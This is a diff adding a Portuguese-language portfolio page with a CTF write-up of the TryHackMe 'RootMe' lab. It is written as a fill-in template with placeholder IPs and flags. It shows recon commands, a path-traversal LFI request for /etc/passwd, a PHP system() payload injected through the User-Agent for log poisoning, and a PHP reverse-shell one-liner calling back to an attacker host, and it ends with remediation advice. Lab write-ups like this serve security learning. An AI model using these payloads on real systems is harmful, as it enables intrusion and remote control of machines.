@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Writeup — RootMe (TryHackMe) | Wilton Lima</title>
+
+  <!-- Font Awesome & AOS -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"/>
+  <link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css"/>
+
+  <!-- Estilos do site (mesmo style.css do seu portfólio) -->
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+
+  <!-- NAVBAR -->
+  <nav>
+    <div class="nav-container">
+      <div class="logo">Wilton <span>Lima</span></div>
+      <div class="links">
+        <a href="index.html#home">Home</a>
+        <a href="index.html#about">Sobre</a>
+        <a href="index.html#skills">Skills</a>
+        <a href="ctfs.html" class="active">CTFs</a>
+        <a href="projetos.html">Projetos</a>
+        <a href="index.html#contact">Contato</a>
+      </div>
+    </div>
+
+    <i class="fa-solid fa-bars hamburg" onclick="hamburg()"></i>
+    <div class="dropdown" id="dropdown">
+      <a href="index.html#home" onclick="cancel()">Home</a>
+      <a href="index.html#about" onclick="cancel()">Sobre</a>
+      <a href="index.html#skills" onclick="cancel()">Skills</a>
+      <a href="ctfs.html" onclick="cancel()">CTFs</a>
+      <a href="projetos.html" onclick="cancel()">Projetos</a>
+      <a href="index.html#contact" onclick="cancel()">Contato</a>
+      <i class="fa-solid fa-xmark cancel" onclick="cancel()"></i>
+    </div>
+  </nav>
+
+  <!-- WRITEUP HEADER -->
+  <header class="section" data-aos="fade-up">
+    <div class="container">
+      <h1 class="section-title">TryHackMe — RootMe</h1>
+      <p class="lead">
+        Writeup: desafio RootMe (exemplo). Objetivo: comprometer a máquina, obter user.txt e root.txt.
+        Nesta página descrevo o processo de reconhecimento, exploração, escalada de privilégios e evidências.
+        Use este modelo como referência e modifique conforme suas notas.
+      </p>
+      <div style="text-align:center; margin-top:14px;">
+        <a href="ctfs.html" class="btn-primary" style="display:inline-block;">Voltar para CTFs</a>
+        <a href="#" class="btn-primary" style="display:inline-block; margin-left:10px;">Baixar PDF</a>
+      </div>
+    </div>
+  </header>
+
+  <!-- METADADOS -->
+  <section class="section" data-aos="fade-up">
+    <div class="container">
+      <div class="project-meta" style="display:flex;flex-wrap:wrap;gap:14px;align-items:center;">
+        <div style="background:#f7f9fc;padding:10px;border-radius:12px;border:1px solid #eee;">
+          <strong>Status:</strong> <span style="color:#16a34a;">Concluído</span>
+        </div>
+        <div style="background:#f7f9fc;padding:10px;border-radius:12px;border:1px solid #eee;">
+          <strong>Plataforma:</strong> TryHackMe
+        </div>
+        <div style="background:#f7f9fc;padding:10px;border-radius:12px;border:1px solid #eee;">
+          <strong>Data:</strong> <!-- preencha --> 2025-10-19
+        </div>
+        <div style="background:#f7f9fc;padding:10px;border-radius:12px;border:1px solid #eee;">
+          <strong>Tags:</strong> Web, LFI, Shell, Escalada
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- RECONHECIMENTO -->
+  <section class="section" data-aos="fade-up">
+    <div class="container">
+      <h2 class="section-subtitle"><i class="fa-solid fa-search"></i> Reconhecimento</h2>
+
+      <p>Primeiro passo: identificar serviços e portas expostas, endpoints web e possíveis caminhos de exploração.</p>
+
+      <h3>Port scan (nmap)</h3>
+      <pre><code>nmap -sC -sV -oN nmap_rootme.txt 10.10.X.X</code></pre>
+      <p>Resultado (exemplo): portas 22 (ssh), 80 (http) e 8080 (web secundário) abertas.</p>
+
+      <h3>Enumerando a web</h3>
+      <pre><code>gobuster dir -u http://10.10.X.X -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -o gobuster_rootme.txt</code></pre>
+      <p>Foram encontradas páginas <code>/admin</code>, <code>/uploads</code> e um endpoint com parâmetro que aparenta aceitar um arquivo ou caminho.</p>
+    </div>
+  </section>
+
+  <!-- EXPLORAÇÃO -->
+  <section class="section" data-aos="fade-up">
+    <div class="container">
+      <h2 class="section-subtitle"><i class="fa-solid fa-bomb"></i> Exploração</h2>
+
+      <p>Com base na enumeração, verifiquei vulnerabilidade de LFI (Local File Inclusion) no parâmetro <code>?page=</code>.</p>
+
+      <h3>Teste rápido de LFI</h3>
+      <pre><code>http://10.10.X.X/index.php?page=../../../../etc/passwd</code></pre>
+      <p>Se exibiu conteúdo de <code>/etc/passwd</code>, confirma LFI.</p>
+
+      <h3>Escalação para RCE via LFI + log poisoning</h3>
+      <ol>
+        <li>Subir payload via user-agent (ou upload) e incluir arquivo de log via LFI.</li>
+        <li>Exemplo de payload (User-Agent): <code><?php system('id'); ?></code></li>
+      </ol>
+
+      <h3>Exemplo de sequência de comandos</h3>
+      <pre><code># enviar requisição com payload no UA
+curl -A "<?php system('id'); ?>" "http://10.10.X.X/index.php?page=php://filter/convert.base64-encode/resource=/var/log/apache2/access.log"
+# depois acessar via LFI:
+http://10.10.X.X/index.php?page=/var/log/apache2/access.log
+</code></pre>
+
+      <p>Se a execução funcionou, conseguimos um shell ou executar comandos de maneira remota.</p>
+    </div>
+  </section>
+
+  <!-- SHELL INTERATIVA -->
+  <section class="section" data-aos="fade-up">
+    <div class="container">
+      <h2 class="section-subtitle"><i class="fa-solid fa-terminal"></i> Shell Interativa</h2>
+
+      <p>Ao obter um prompt limitado, tentei estabilizar com um reverse shell:</p>
+
+      <pre><code># do atacante (escutar)
+nc -lvnp 4444
+
+# do servidor (payload PHP)
+php -r '$sock=fsockopen("10.10.Y.Y",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+</code></pre>
+
+      <p>Depois de estabilizar o shell, coletei informações locais:</p>
+      <pre><code>whoami
+id
+uname -a
+cat /etc/issue
+</code></pre>
+    </div>
+  </section>
+
+  <!-- ESCALAÇÃO DE PRIVILÉGIOS -->
+  <section class="section" data-aos="fade-up">
+    <div class="container">
+      <h2 class="section-subtitle"><i class="fa-solid fa-level-up-alt"></i> Escalada de Privilégios</h2>
+
+      <p>Procurei por binários SUID, serviços configurados incorretamente e arquivos com credenciais:</p>
+
+      <pre><code>find / -perm -4000 -type f 2>/dev/null
+sudo -l
+ps aux --forest
+</code></pre>
+
+      <p>Encontrei um binário SUID vulnerável (exemplo) que permitiu execução de comandos como root.</p>
+
+      <h3>Exemplo (SUID exploit)</h3>
+      <pre><code>./vulnerable_suid
+# se o binário executar um shell com privilégios, pegar /root/root.txt
+cat /root/root.txt
+</code></pre>
+
+    </div>
+  </section>
+
+  <!-- FLAGS & EVIDÊNCIAS -->
+  <section class="section" data-aos="fade-up">
+    <div class="container">
+      <h2 class="section-subtitle"><i class="fa-solid fa-flag"></i> Flags & Evidências</h2>
+
+      <p>Flags encontradas:</p>
+      <ul>
+        <li><strong>user.txt</strong> — <code>example_user_flag{abc123}</code></li>
+        <li><strong>root.txt</strong> — <code>example_root_flag{def456}</code></li>
+      </ul>
+
+      <h3>Comandos e logs principais</h3>
+      <pre><code># nmap -sC -sV -oN nmap_rootme.txt 10.10.X.X
+# gobuster dir -u http://10.10.X.X -w wordlist.txt -o gobuster_rootme.txt
+# nc -lvnp 4444
+# whoami; id; uname -a
+</code></pre>
+    </div>
+  </section>
+
+  <!-- REMEDIAÇÃO E CONCLUSÕES -->
+  <section class="section" data-aos="fade-up">
+    <div class="container">
+      <h2 class="section-subtitle"><i class="fa-solid fa-wrench"></i> Remediação & Conclusão</h2>
+
+      <p><strong>Remediação recomendada:</strong></p>
+      <ul>
+        <li>Evitar inclusão direta de arquivos sem validação; usar whitelist de páginas permitidas.</li>
+        <li>Configurar logs para evitar que entradas controladas pelo usuário sejam executadas.</li>
+        <li>Remover SUIDs supérfluos e revisar permissões de arquivos.</li>
+        <li>Adoção de WAF / validação de entrada para parâmetros de URL.</li>
+      </ul>
+
+      <p><strong>Conclusão:</strong> O RootMe foi explorado com LFI combinado com log poisoning para execução remota, seguido de enumeração local e exploração de SUID para obter root. Este writeup documenta o fluxo da exploração e as ações realizadas.</p>
+    </div>
+  </section>
+
+  <!-- REFERÊNCIAS / LINKS ÚTEIS -->
+  <section class="section" data-aos="fade-up">
+    <div class="container">
+      <h2 class="section-subtitle"><i class="fa-solid fa-book"></i> Referências</h2>
+      <ul>
+        <li><a href="https://tryhackme.com" target="_blank" rel="noopener">TryHackMe</a></li>
+        <li><a href="https://owasp.org" target="_blank" rel="noopener">OWASP — Guia de LFI e boas práticas</a></li>
+        <li><a href="https://gtfobins.github.io" target="_blank" rel="noopener">GTFOBins — Exploits para SUID</a></li>
+      </ul>
+    </div>
+  </section>
+
+  <!-- BOTÕES RÁPIDOS -->
+  <section class="section" data-aos="fade-up">
+    <div class="container" style="text-align:center;">
+      <a href="ctfs.html" class="btn-primary">Voltar para CTFs</a>
+      <a href="projetos.html" class="btn-primary" style="margin-left:10px;">Ver Projetos</a>
+    </div>
+  </section>
+
+  <footer class="footer">
+    <p>© <span id="year"></span> Wilton Lima — Todos os direitos reservados.</p>
+  </footer>
+
+  <!-- SCRIPTS -->
+  <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+  <script>
+    AOS.init({
+      duration: 900,
+      once: true
+    });
+  </script>
+  <script src="script.js"></script>
+</body>
+</html>
